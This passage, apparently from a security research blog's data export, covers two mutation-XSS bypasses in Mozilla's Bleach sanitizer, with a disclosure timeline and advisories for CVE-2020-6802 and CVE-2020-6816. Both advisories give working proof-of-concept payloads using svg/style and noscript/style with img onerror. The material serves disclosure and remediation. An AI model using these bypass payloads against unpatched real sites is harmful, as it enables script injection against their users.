***svg*** tag:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-11.png\" style=\"width: 100%;\"/>\n\nThis shows how differently the data inside the ***style*** tag is being parsed. In addition, some unwanted tags inside the ***svg/math*** will automatically pop out of the ***svg/math*** and will be parsed as HTML (e.g., ***&lt;img>***). When the team tried to put a malicious img tag in ***svg/math->style->img***, Bleach acted strangely. In case the ***img*** tag was whitelisted, it parsed it like the browser and sanitized unwanted attributes as expected. And when the **“strip”** variable was set to true (meaning it will delete unwanted data instead of sanitizing it, default is false), it got deleted. But in case **“strip”** was not changed, we could use any tag that wasn’t allowed and bypass Bleach.\n\n<img src=\"/img/blogs/mozilla-bleach/Image-11.png\" style=\"width: 100%;\"/>\n\nAfter further investigation, we saw that html5lib (the parser behind Bleach) does recognize the data inside ***svg->style*** as tags. But for some reason, Bleach doesn’t sanitize unwanted tags.\n\n# Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n# Summary of Disclosure and Events\nWhen the first vulnerability was discovered, our research team ensured that they could reproduce the process of exploiting it. Once that was confirmed, the Checkmarx team responsibly notified Mozilla of their findings. Subsequently, they opened a Bugzilla ticket where the team helped Mozilla find a proper mitigation approach, and they fixed the issue rapidly. Soon after that, the second vulnerability was discovered by the research team. Again, a responsible notification was sent to Mozilla, and a Bugzilla ticket was quickly opened and resolved. Checkmarx customers using CxSCA were automatically notified to update Mozilla-Bleach.\n\n# Bugzilla Tickets\n* CVE-2020-6802 - https://bugzilla.mozilla.org/show_bug.cgi?id=1615315 \n* CVE-2020-6816 - https://bugzilla.mozilla.org/show_bug.cgi?id=1621692\n\n# Timeline of Disclosure\n| Date    | Action |\n| -------- | ------- |\n| 13-Feb-2020 | First vulnerability reported |\n| 14-Feb-2020 | Checkmarx customers who were using Bleach were warned, without exposing the vulnerability's details |\n| 19-Feb-2020 | Fixed version v3.1.1 and an advisory on GitHub was released |\n| 25-Feb-2020 | CVE-2020-6802 was assigned |\n| 11-Mar-2020 | Second vulnerability reported |\n| 11-Mar-2020 | Checkmarx customers who were using Bleach were warned, without exposing the vulnerability's details |\n| 17-Mar-2020 | Fixed version v3.1.2 and an advisory on GitHub was released |\n| 19-Mar-2020 | CVE-2020-6816 was assigned |\n\n# Final Words\nDiscovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source packages. With open source making up the vast majority of today’s commercial software projects, security vulnerabilities must be taken seriously and handled more carefully across the industry. Solutions like CxSCA are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture.\n\n# References\n* [XSS](https://owasp.org/www-community/attacks/xss/) \n* [mXSS](https://cure53.de/fp170.pdf)\n* [CVE-2020-6802 advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-q65m-pv3f-wr5r)\n* [CVE-2020-6816 advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-m6xf-fq7q-8743)\n* [CVE-2020-6802 Bugzilla ticket](https://bugzilla.mozilla.org/show_bug.cgi?id=1615315) \n* [CVE-2020-6816 Bugzilla ticket](https://bugzilla.mozilla.org/show_bug.cgi?id=1621692) ","tags":["xss","mxss","bypass","python","mozilla"]},{"title":"Mutation XSS in Mozilla-bleach via svg or math","url":"/2020/03/16/Mutation XSS in Mozilla-bleach via svg or math/","content":"## Summary\nMutation XSS (mXSS) vulnerability in Mozilla-bleach , when RCDATA and either svg or math tags are whitelisted and the keyword argument `strip=False`. It happens due to improper sanitization of the RCDATA tags (`script, noscript, style, noframes, xmp, noembed` and `iframe`) when placed under `svg` or `math`, allowing the browser to execute arbitrary HTML in RCDATA on the victim's browser.\n\n## Product\nBleach before 3.1.2\n\n## Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n## Steps to reproduce\n```\n>>> import bleach\n>>> bleach.clean('<svg><style><img src=x onerror=alert(1)>', tags=[\"svg\",\"style\"])\n```\n\n### Expected result:\n```<svg><style><img src=x onerror=alert(1)></style></svg>```\n\n## Remediation\nUpdate bleach dependency to 3.1.2 and above\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Blog](https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach)\n2. [Advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-m6xf-fq7q-8743)\n3. Commit [175f677](https://github.com/mozilla/bleach/commit/175f67740e7951e1d80cefb7831e6c3e4efeb986)\n","tags":["xss","mxss","bypass","python","mozilla"]},{"title":"Mutation XSS in Mozilla-bleach via noscript","url":"/2020/02/24/Mutation XSS in Mozilla-bleach via noscript/","content":"## Summary\nMutation XSS (mXSS) vulnerability in Mozilla-bleach when `noscript` tag is allowed in addition to one of the following tags: `title, textarea, script, style, noembed, noframes, iframe, xmp or comment`. \n\nThis occurs due to bleach utilizing its parser, html5lib, with `scripting=False`. In this case, the data of the noscript tags will be parsed as HTML, while the browser parses them as rawdata. \nThis can cause arbitrary HTML and JavaScript codes to run on the victim's browser.\n\n## Product\nBleach before 3.1.1\n\n## Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n## Steps to reproduce\n```\n>>> import bleach\n>>> bleach.clean('<noscript><style></noscript><img src=x onerror=alert(1)>', tags=[\"noscript\",\"style\"])\n```\n\n### Expected result:\n```<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>```\n\n## Remediation\nUpdate bleach dependency to 3.1.1 and above\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Blog](https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach)\n2. [Advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-q65m-pv3f-wr5r)\n3. Commit [f77e0f6](https://github.com/mozilla/bleach/commit/f77e0f6392177a06e46a49abd61a4d9f035e57fd)\n","tags":["xss","mxss","bypass","python","mozilla"]}]